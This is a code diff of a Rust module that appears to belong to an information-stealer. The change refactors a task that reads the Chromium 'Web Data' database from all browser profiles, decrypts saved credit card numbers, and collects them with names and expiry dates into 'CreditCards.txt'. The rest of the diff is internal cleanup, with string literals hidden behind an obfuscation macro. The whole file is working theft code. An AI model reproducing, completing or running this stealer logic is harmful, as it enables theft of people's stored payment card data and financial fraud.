@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, CreditCard};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, CreditCard, SqliteDatabase};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
@@ -30,7 +30,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
     parent_name!("CreditCards.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(mut credit_cards) = collect_and_read_sqlite_from_all_profiles(
+        let Some(mut credit_cards) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
             &StorageFileSystem,
             |profile| profile / s!("Web Data"),
@@ -50,14 +50,13 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
     }
 }
 
-fn extract_card_from_record(
-    record: &dyn TableRecord,
+fn extract_card_from_record<R: TableRecord>(
+    record: &R,
     browser_data: &BrowserData,
 ) -> Option<CreditCard> {
     let name_on_card = record
         .get_value(CREDIT_CARDS_NAME_ON_CARD)?
-        .as_string()?
-        .to_owned();
+        .as_string()?;
     let expiration_month = record
         .get_value(CREDIT_CARDS_EXPIRATION_MONTH)?
         .as_integer()?;
@@ -67,7 +66,7 @@ fn extract_card_from_record(
     let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;
 
     let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
-    let card_number = unsafe { decrypt_data(encrypted_card_number, browser_data) }?;
+    let card_number = unsafe { decrypt_data(&encrypted_card_number, browser_data) }?.into();
 
     Some(CreditCard {
         name_on_card,
